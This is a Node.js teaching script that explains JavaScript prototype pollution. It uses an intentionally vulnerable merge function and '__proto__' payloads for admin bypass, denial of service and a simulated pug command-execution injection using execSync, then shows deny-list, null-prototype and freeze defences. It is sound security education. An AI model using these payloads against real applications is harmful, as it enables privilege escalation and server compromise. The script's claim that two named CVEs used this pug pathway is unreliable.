/**
 * =====================================================================
 *  STANDALONE DEMO — Prototype Pollution Concept Explanation
 *  No server needed. Run directly: node demos/concept-demo.js
 *
 *  This script walks through the prototype chain mechanics step by step
 *  and demonstrates all three attack types in pure JavaScript.
 * =====================================================================
 */

console.log('\n═══════════════════════════════════════════════════════════');
console.log('  PROTOTYPE POLLUTION — Standalone Concept Demo');
console.log('  Marwa Hoshia & Fatima Abu Abed');
console.log('═══════════════════════════════════════════════════════════\n');

// -------------------------------------------------------
// PART 1: How the prototype chain works
// -------------------------------------------------------
console.log('━━━ PART 1: JavaScript Prototype Chain ━━━━━━━━━━━━━━━━━━\n');

const obj = {};
console.log('  const obj = {}');
console.log(`  obj.__proto__ === Object.prototype → ${obj.__proto__ === Object.prototype}`);
console.log(`  obj.constructor === Object         → ${obj.constructor === Object}`);
console.log(`  obj.constructor.prototype === Object.prototype → ${obj.constructor.prototype === Object.prototype}`);
console.log(`  obj.hasOwnProperty('isAdmin')      → ${obj.hasOwnProperty('isAdmin')} (not set yet)`);
console.log('');

// -------------------------------------------------------
// PART 2: How unsafeMerge works and why it's vulnerable
// -------------------------------------------------------
console.log('━━━ PART 2: The Vulnerable Merge Function ━━━━━━━━━━━━━━━\n');

function unsafeMerge(target, source) {
  for (const key in source) {         // for...in traverses prototype chain too!
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      unsafeMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

console.log('  Unsafe merge function iterates with for...in');
console.log('  When key = "__proto__", target["__proto__"] resolves to Object.prototype!');
console.log('  So: target["__proto__"].isAdmin = true → Object.prototype.isAdmin = true\n');

// -------------------------------------------------------
// PART 3: ATTACK 1 — Privilege Escalation
// -------------------------------------------------------
console.log('━━━ PART 3: Attack 1 — Privilege Escalation ━━━━━━━━━━━━━\n');

const userProfile = { username: 'alice', email: 'alice@example.com' };
const maliciousPayload = JSON.parse('{"__proto__": {"isAdmin": true, "role": "admin"}}');

console.log('  [BEFORE ATTACK]');
const freshUser1 = {};
console.log(`  freshUser1.isAdmin = ${freshUser1.isAdmin}   → Access: ${freshUser1.isAdmin ? 'GRANTED' : 'DENIED'}`);

console.log('\n  [ATTACKER SENDS PAYLOAD]');
console.log('  Payload: {"__proto__": {"isAdmin": true, "role": "admin"}}');
unsafeMerge(userProfile, maliciousPayload);

console.log('\n  [AFTER ATTACK]');
const freshUser2 = {};
console.log(`  freshUser2.isAdmin              = ${freshUser2.isAdmin}`);
console.log(`  freshUser2.role                 = ${freshUser2.role}`);
console.log(`  freshUser2.hasOwnProperty('isAdmin') = ${freshUser2.hasOwnProperty('isAdmin')} (not own property!)`);
console.log(`  Object.prototype.isAdmin        = ${Object.prototype.isAdmin}`);
console.log(`  Access result: ${freshUser2.isAdmin ? '🔓 GRANTED — Admin bypass successful!' : '🔒 DENIED'}`);

// Cleanup
delete Object.prototype.isAdmin;
delete Object.prototype.role;

// -------------------------------------------------------
// PART 4: ATTACK 2 — Denial of Service
// -------------------------------------------------------
console.log('\n━━━ PART 4: Attack 2 — Denial of Service (DoS) ━━━━━━━━━━\n');

const dosPayload = JSON.parse('{"__proto__": {"timeout": "CORRUPTED_STRING"}}');
const serverConfig = { debug: false };

console.log('  [BEFORE ATTACK] Server config uses numeric timeout');
let safeTimeout = 30;
console.log(`  timeout = ${safeTimeout}, timeout * 1000 = ${safeTimeout * 1000} ms ✅`);

console.log('\n  [ATTACKER POLLUTES timeout with a string]');
unsafeMerge(serverConfig, dosPayload);

console.log('\n  [AFTER ATTACK] New config object inherits corrupted timeout');
const newConfig = {};
console.log(`  newConfig.timeout = "${newConfig.timeout}" (type: ${typeof newConfig.timeout})`);
const result = newConfig.timeout * 1000;
console.log(`  newConfig.timeout * 1000 = ${result} (NaN — computation broken!)`);
console.log(`  isNaN(result) = ${isNaN(result)} → Server throws error → 💥 DoS achieved!`);

// Cleanup
delete Object.prototype.timeout;

// -------------------------------------------------------
// PART 5: ATTACK 3 — RCE Pathway
// -------------------------------------------------------
console.log('\n━━━ PART 5: Attack 3 — RCE Simulation ━━━━━━━━━━━━━━━━━━\n');

const rcePayload = JSON.parse(
  '{"__proto__": {"outputFunctionName": "x; require(\'child_process\').execSync(\'id\'); x"}}'
);
const templateSource = { name: 'dashboard' };

// Simulate how pug/jade reads options
function simulatePugRender(options) {
  // In real pug source code (vulnerable versions), this key is passed to:
  // new Function('locals', outputFunctionName + '...')
  // which evaluates it as JavaScript code.
  if (options.outputFunctionName) {
    return `[SIMULATED RCE] Would eval: ${options.outputFunctionName}`;
  }
  return '[Normal render] <html>...</html>';
}

console.log('  [BEFORE ATTACK] Fresh options object renders normally');
const cleanOptions = {};
console.log(`  simulatePugRender({}) → "${simulatePugRender(cleanOptions)}"`);

console.log('\n  [ATTACKER POLLUTES outputFunctionName]');
console.log('  Payload: {"__proto__": {"outputFunctionName": "x; execSync(\'id\'); x"}}');
unsafeMerge(templateSource, rcePayload);

console.log('\n  [AFTER ATTACK] Empty options {} now inherits the RCE payload');
const attackerOptions = {};
console.log(`  attackerOptions.outputFunctionName = "${attackerOptions.outputFunctionName}"`);
console.log(`  simulatePugRender({}) → "${simulatePugRender(attackerOptions)}"`);
console.log('\n  💀 In real vulnerable pug versions, this executes OS commands on the server!');
console.log('  → CVE-2019-8331, CVE-2021-23337 used this exact pathway.');

// Cleanup
delete Object.prototype.outputFunctionName;

// -------------------------------------------------------
// PART 6: Defenses in action
// -------------------------------------------------------
console.log('\n━━━ PART 6: Defenses ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');

// Defense 1: Key sanitization
function safeMerge(target, source) {
  const BLOCKED = new Set(['__proto__', 'constructor', 'prototype']);
  for (const key of Object.keys(source)) {  // Object.keys, not for...in
    if (BLOCKED.has(key)) {
      console.log(`  [BLOCKED] Dangerous key detected and skipped: "${key}"`);
      continue;
    }
    if (typeof source[key] === 'object' && source[key] !== null) {
      target[key] = safeMerge(target[key] || Object.create(null), source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

console.log('  Defense 1: safeMerge with key deny-list\n');
const safeProfile = { username: 'alice' };
safeMerge(safeProfile, JSON.parse('{"__proto__": {"isAdmin": true}}'));
const testAfterFix = {};
console.log(`  After safeMerge: testObj.isAdmin = ${testAfterFix.isAdmin} (undefined — attack failed!)\n`);

// Defense 2: Object.create(null)
console.log('  Defense 2: Object.create(null)\n');
const nullObj = Object.create(null);
console.log(`  nullObj.__proto__ = ${nullObj.__proto__}  (no prototype!)`);
console.log(`  nullObj.isAdmin   = ${nullObj.isAdmin}    (even after pollution, unreachable)`);

// Defense 3: Object.freeze
console.log('\n  Defense 3: Object.freeze(Object.prototype)\n');
Object.freeze(Object.prototype);
try {
  Object.prototype.isAdmin = true; // This will throw in strict mode, silently fail otherwise
  console.log(`  After freeze attempt: Object.prototype.isAdmin = ${Object.prototype.isAdmin}`);
} catch (e) {
  console.log(`  ✅ TypeError thrown: "${e.message}" — prototype is frozen!`);
}

console.log('\n═══════════════════════════════════════════════════════════');
console.log('  Demo complete. All attack types demonstrated successfully.');
console.log('═══════════════════════════════════════════════════════════\n');
